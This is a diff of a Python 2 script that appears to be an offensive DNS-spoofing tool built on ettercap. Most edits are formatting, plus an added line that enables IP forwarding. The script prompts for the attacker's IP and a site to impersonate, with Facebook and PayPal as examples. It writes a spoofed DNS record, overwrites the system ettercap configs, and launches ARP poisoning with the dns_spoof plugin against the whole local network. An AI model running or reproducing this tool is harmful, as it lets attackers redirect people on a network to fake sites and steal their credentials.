@@ -3,7 +3,7 @@
 import os
 import time
 import subprocess
-import sys
+from pathlib2 import Path
 
 
 class bcolors:
@@ -16,35 +16,34 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-#Verify System and clean up afterlast usage
-from pathlib2 import Path
 
+# Verify System and clean up afterlast usage
 file1 = Path("src/etter.dns")
 if file1.is_file():
     subprocess.call(['rm', 'src/etter.dns'])
 else:
     pass
 
-#Getting the Network Interface Card Information.
-#This is the interface that ettercap will listen on.
+# Getting the Network Interface Card Information.
+# This is the interface that ettercap will listen on.
 print bcolors.OKGREEN
 iface = raw_input('Whats is your network interface?\n (example: eth0, wlan0)\n Interface: ')
 print ("Interface set to set to: %s.") % iface
 iface = "%s" % iface
 print ("\n")
 
-#Define the attackers lan IP
+# Define the attackers lan IP
 lanip = raw_input('Whats is your ip?\n IP: ')
 print ("LAN IP: %s.") % lanip
 
-#Define the gateway IP
-#gwip = raw_input('Whats is your Gateway/Router IP?\n IP: ')
-#print 'Gateway IP: %s.' % gwip
+# Define the gateway IP
+# gwip = raw_input('Whats is your Gateway/Router IP?\n IP: ')
+# print 'Gateway IP: %s.' % gwip
 
 print bcolors.ENDC
 print bcolors.HEADER
 
-#Getting the source address to spoof
+# Getting the source address to spoof
 print("What website do you wish to spoof?\n")
 print("Examples: https://facebook.com https://paypal.com \n")
 print("You can also spoof spesific or all subdomains by using wildcard")
@@ -56,7 +55,7 @@ target = raw_input('Input Source to spoof\n URL: ')
 print("Target address %s.") % target
 print bcolors.ENDC
 
-#Writes out the config to etter.dns
+# Writes out the config to etter.dns
 with open('src/etter.dns', 'w+') as f:
     f.writelines(target)
     f.write(' A ')
@@ -64,17 +63,21 @@ with open('src/etter.dns', 'w+') as f:
 
 print("Backing up ettercap config and creating our own")
 
-#Ettercap Config (etter.dns)
+# Ettercap Config (etter.dns)
 subprocess.call(['mv', '/etc/ettercap/etter.conf', '/etc/ettercap/etter.conf.bak'])
 subprocess.call(['cp', 'src/etter.conf', '/etc/ettercap/etter.conf'])
 
-#Ettercap DNS config (etter.dns)
+# Ettercap DNS config (etter.dns)
 subprocess.call(['mv', '/etc/ettercap/etter.dns', '/etc/ettercap/etter.dns.bak'])
 subprocess.call(['cp', 'src/etter.dns', '/etc/ettercap/etter.dns'])
 print 'Done!'
 
+# Forward Traffic to WAN
+subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True).wait()
+
+# Forward Traffix
 print bcolors.WARNING
-#Starting up ettercap and launching the attack
+# Starting up ettercap and launching the attack
 print("Starting the Attack NOW!""\n")
 print bcolors.ENDC
 print bcolors.FAIL
@@ -84,7 +87,7 @@ time.sleep(1)
 
 if os.path.isfile('src/config.py'):
     from src.config import etterdir
-    subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
+    subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///', ])
 else:
-    subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
+    subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///', ])
 exit(1)
